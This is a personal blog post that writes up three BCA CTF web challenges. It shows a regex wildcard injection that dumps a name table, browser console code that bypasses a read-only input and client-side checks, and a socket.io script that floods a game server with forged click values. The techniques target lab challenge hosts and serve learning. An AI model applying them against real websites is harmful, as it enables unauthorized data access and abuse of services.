---
layout: post
title: "The Summer of Challs: Week 5"
date: 2024-06-16
categories: CTFs
---

This week, I tried a bunch of web challenges from BCA CTF. Here were the ones I solved:

## NOSQL

Upon opening the page, we simply see the message: "Not a valid query : (". 

![NoSQL](/assets/NoSQL.jpg)

Based on the title and challenge description, I knew that I had to do some kind of NoSQL injection. I read the source code to figure out how the application was set up. 

Essentailly, all the lines of a file called 'table.txt' are read into a variable. The app then checks what we send through this part of the code:

```Javascript
app.get('/', (req, res) => {
    if (!req.query.name) {
        res.send("Not a valid query :(")
        return;
    }
    let goodLines = []
    text.forEach( line => {
        if (line.match('^'+req.query.name+'$')) {
            goodLines.push(line)
        }
    });
    res.json({"rtnValues":goodLines})
})
```

It returned "Not a valid query : (" because we didn't put a name parameter in the query string. Once we do, the app loops through the elements of the array that stores the text file lines, and uses a regex expression to match whatever we inputted. Any matches are pushed to a new array, and returned to the front end where the user can supposedly see it. 
 
I reasoned that I needed to make some sort of query that would leak this table, and then make a query according to what was shown in another part of the source code to get the flag:

```JS
app.get('/:id/:firstName/:lastName', (req, res) => {
    // Implementation not shown
    res.send("FLAG")
})
```

In order to make a query that returned the whole table, whatever we passed had to return a match for any of the names. This means we need to bypass the regex check somehow. I did this with the wildcard `.*` which matches anything in this given regex expression. I made a query like this: `url/?name=.*`, and the server returned this:

![NoSql](/assets/%20noSQLNames.jpg)

The last element in this returned array is "Flag Holder", which is obviously the user we need to query for the flag. I copied the array into the console and checked for its length, which was 51. I thought that the user was of ID 50, because I assumed the counting started from 0. This however didn't work, so the IDs must have been counted from 1. 

I then made this request: `url/51/Flag/Holder`, and got the flag:

![NoSql](/assets/NoSQLFlag.jpg)

## PHONE NUMBER

![PhoneNumber](/assets/PhoneNumber.JPG)

We are told to enter our phone number, but can't type anything in. Instead, we have to roll dice, add and subtract the values from these dice, and add the resulting value, one digit at a time. The phone number we need to enter, given by the challenge, is 1234567890. 

The frontend code (they used inline scripting) ensures that we can't actually enter the phone number through this long dice method because anytime we roll snake eyes (two 1s), it will reset the input. And, if at any point, we are at "123456789", it will make sure we roll snake eyes before we can complete the number.

We can't type anything in because they have added a "readonly" attribute to the input box. When we hit submit, it sends our number to a /flag endpoint in the website, where it will return incorrect because it is impossible to send the full number. 

I actually solved this in the console. First, I cloned the input element and removed the readOnly attribute:

```Javascript
var inputField = document.getElementById('input');

function replaceInputElement(element) {
    var newElement = element.cloneNode(true);
    element.parentNode.replaceChild(newElement, element);
    return newElement;
}

inputField = replaceInputElement(inputField);
inputField.removeAttribute('readonly');
```

Then, I wrote a new submit function to make sure we were submitting from our new element:

```Javascript
async function submit() {
    var inputField = document.getElementById('input'); // Ensure this is the updated input field

    if (!inputField.value) {
        alert("Please enter a phone number.");
        return;
    }

    var c = confirm("Is " + inputField.value + " the correct phone number?");
    if (!c) return;

    await fetch('/flag', {
        method: "POST",
        body: inputField.value
    }).then((res) => res.text()).then((text) => text.length !== 0 ? document.body.innerHTML = text : alert("Sorry, incorrect."));
```

After running this code, I could type in the input box. From there, I just typed the phone number, hit submit, and got the flag: 

![Phone Number](/assets/PhoneNumberFlag.jpg)

## COOKIE CLICKER

![Cookie Clicker](/assets/CookieClicker.jpg)

The webapp here is basically a picture of a cookie. We can click it which increments a counter, and in order to get the flag, we have to click it 1e20 times. I don't think even the best cookie clicker players can get that manually.

The server used a websocket and some weird calcuations with exponents and Math.random() to make sure that the client is synchronous with it. Essentially, this made it hard for us to just make a script that made many requests. 

However, this is basically what I ended up doing: writing a script that connected to the websocket, and sent it massive numbers thousands of times. Due to the insychronous nature of both ends using Math.Random(), there were some delays. However, I did get this script to work: 

```Javascript
const io = require('socket.io-client');
const socket = io('http://challs.bcactf.com:31386'); 

socket.on('connect', () => {
    console.log('Connected to the server');
    
    let totalClicks = 1000000;
    let currentValue = 0;

    for (let i = 0; i < totalClicks; i++) {
        let clickData = JSON.stringify({
            value: currentValue,
            power: Number.MAX_SAFE_INTEGER * Number.MAX_SAFE_INTEGER
        });

        socket.emit('click', clickData);
        currentValue += Math.floor(Math.random() * 1000000) + 1;


        socket.on('recievedScore', (msg) => {
            let data = JSON.parse(msg);
            console.log(`Current Score: ${data.value}`);
            console.log('clickCount: ' + i)
        });

        socket.on('error', (err) => {
            console.log(`Error: ${err}`);
        });

        if (currentValue > 1e20) {
            console.log('1e20 cookies');
            break;
        }
    }
});

socket.on('disconnect', () => {
    console.log('Disconnected from the server');
});
```

I ran it and got the flag in the terminal:


![Cookie Clicker](/assets/CookieClickerFlag.jpg)

I'm not sure if this was the most efficient or intended way of solving this, but it got me the flag!

I would say that these challenges weren't exactly my favorite, but they helped iron out javascript skills a bit. The web grind continues this week! 